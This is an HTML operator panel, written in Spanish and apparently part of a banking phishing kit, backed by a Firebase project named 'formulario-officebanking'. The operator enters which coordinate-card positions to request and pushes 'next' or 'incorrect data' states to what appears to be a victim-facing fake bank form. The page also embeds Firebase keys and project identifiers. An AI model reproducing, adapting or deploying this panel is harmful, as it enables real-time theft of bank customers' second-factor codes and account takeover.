
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel de Control</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    h2 {
      color: #333;
    }
    .fila {
      margin-bottom: 20px;
    }
    input[type="text"] {
      width: 40px;
      padding: 8px;
      font-size: 16px;
      text-align: center;
      margin-right: 10px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      margin-right: 10px;
    }
    .coordenadas-panel {
      display: flex;
      gap: 10px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <h2>Panel de Control</h2>

  <div class="fila">
    <strong>Coordenadas a solicitar:</strong>
    <div class="coordenadas-panel">
      <input type="text" id="coord1" maxlength="2" />
      <input type="text" id="coord2" maxlength="2" />
      <input type="text" id="coord3" maxlength="2" />
    </div>
    <button onclick="actualizarCoordenadas()">Guardar Coordenadas</button>
  </div>

  <div class="fila">
    <button onclick="setEstado('siguiente')">✅ Siguiente</button>
    <button onclick="setEstado('error')">❌ Datos ingresados Incorrectamente</button>
  </div>

  <div id="info"></div>

  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function setEstado(valor) {
      db.ref("validacion_estado").set(valor);
    }

    function actualizarCoordenadas() {
      const c1 = document.getElementById("coord1").value.trim().toUpperCase();
      const c2 = document.getElementById("coord2").value.trim().toUpperCase();
      const c3 = document.getElementById("coord3").value.trim().toUpperCase();
      const valor = [c1, c2, c3].join(" ");
      db.ref("coordenadas_solicitadas").set(valor);
      document.getElementById("info").textContent = "✅ Coordenadas actualizadas: " + valor;
    }
  </script>
</body>
</html>
